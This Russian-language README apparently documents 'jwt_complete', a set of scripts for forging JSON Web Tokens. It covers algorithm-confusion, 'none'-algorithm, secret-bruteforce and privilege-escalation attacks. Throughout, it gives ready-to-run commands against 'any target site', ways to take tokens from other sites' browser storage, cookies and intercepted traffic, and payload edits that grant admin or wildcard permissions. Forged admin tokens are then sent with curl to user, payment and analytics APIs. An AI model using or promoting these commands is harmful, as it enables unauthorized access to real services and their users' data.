# jwt_complete
Просто подставляйте любые JWT токены и URL - инструменты автоматически адаптируются под алгоритм и структуру токена

Универсальность инструментов:

✅ Поддерживаемые алгоритмы JWT:
•  RS256, RS384, RS512 (RSA)
•  HS256, HS384, HS512 (HMAC) 
•  ES256, ES384, ES512 (ECDSA)
•  PS256, PS384, PS512 (RSA-PSS)
•  none (отсутствие подписи)

✅ Типы атак работают с любыми JWT:
•  Algorithm Confusion - работает с любым RS256 → HS256
•  None Algorithm Bypass - универсальная атака
•  Secret Bruteforce - для любых HMAC токенов
•  Privilege Escalation - модифицирует любые payload

🔧 Как адаптировать:

1. Замена публичного ключа (если есть доступ к другому):
python
# В файлах найдите эту строку и замените на новый публичный ключ:
public_key_n = "НОВЫЙ_ПУБЛИЧНЫЙ_КЛЮЧ_В_BASE64"

2. Настройка payload для конкретного сайта:
bash
# Анализируем структуру токена целевого сайта
python3 jwt_analyzer.py 'TARGET_SITE_JWT_TOKEN'

# Используем интерактивный режим для кастомизации
python3 jwt_bypass_interactive.py 'TARGET_SITE_JWT_TOKEN'


3. Автоматическое тестирование на любом сайте:
bash
python3 jwt_complete_test.py 'ANY_JWT_TOKEN' 'https://target-site.com/api/endpoint'
python3 jwt_advanced_bypass.py 'ANY_JWT_TOKEN' 'https://target-site.com/admin'

🎯 Реальные примеры использования:

Пример 1: Тестирование e-commerce сайта
bash
# Получаем JWT из авторизации на сайте
JWT_TOKEN="eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9..."

# Комплексное тестирование
python3 jwt_complete_test.py "$JWT_TOKEN" 'https://shop.example.com/admin/orders'

# Проверяем админские эндпоинты
./jwt_test.sh 'https://shop.example.com/admin/users' "$BYPASS_TOKEN"

Пример 2: API микросервисов
bash
# Тестируем разные сервисы с одним токеном
python3 jwt_quick_bypass.py "$JWT_TOKEN" admin

# Тестируем на разных эндпоинтах
curl -H "Authorization: Bearer $ADMIN_TOKEN" https://api.service1.com/users
curl -H "Authorization: Bearer $ADMIN_TOKEN" https://api.service2.com/payments
curl -H "Authorization: Bearer $ADMIN_TOKEN" https://api.service3.com/analytics
Пример 3: Single Page Application (SPA)
bash
# Перехватываем JWT из localStorage/cookies браузера
JWT_FROM_BROWSER="eyJ..."

# Анализируем и создаем атаки
python3 jwt_analyzer.py "$JWT_FROM_BROWSER"
python3 jwt_advanced_bypass.py "$JWT_FROM_BROWSER" 'https://app.target.com/api/admin'
🔍 Получение JWT токенов с других сайтов:

Методы извлечения:
1. Browser DevTools → Application → Storage → JWT в localStorage/sessionStorage
2. Burp Suite/OWASP ZAP → перехват HTTP заголовков Authorization
3. Browser Network Tab → поиск Bearer токенов в запросах
4. Cookies → поиск JWT в cookie values
5. URL параметры → некоторые сайты передают JWT в GET параметрах

Быстрая проверка формата JWT:
bash
# JWT всегда имеет формат: xxxxx.yyyyy.zzzzz
echo "$POTENTIAL_JWT" | grep -E '^[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*$'

🛡️ Адаптация под специфику сайтов:
Кастомизация payload полей:
python
# Модифицируйте jwt_quick_bypass.py для специфических полей
payload['department'] = 'IT'           # Корпоративные системы
payload['subscription'] = 'premium'    # SaaS платформы  
payload['permissions'] = ['*']         # Системы с детальными правами
payload['tenant_id'] = 'admin'         # Multi-tenant приложения
Настройка заголовков для специфических API:
bash
# В jwt_test.sh добавьте специфические заголовки
curl -H "Authorization: Bearer $TOKEN" \
     -H "X-API-Key: xyz" \
     -H "X-Tenant: admin" \
     "$TARGET_URL"

🚀 Готовые команды для быстрого старта:
bash
# Универсальная команда для любого сайта
python3 jwt_complete_test.py 'PASTE_ANY_JWT_HERE' 'https://any-target-site.com/api'

# Быстрый тест топ-5 атак
python3 jwt_quick_bypass.py 'ANY_JWT' admin

# Полное автоматизированное тестирование  
python3 jwt_advanced_bypass.py 'ANY_JWT' 'https://target.com/endpoint'
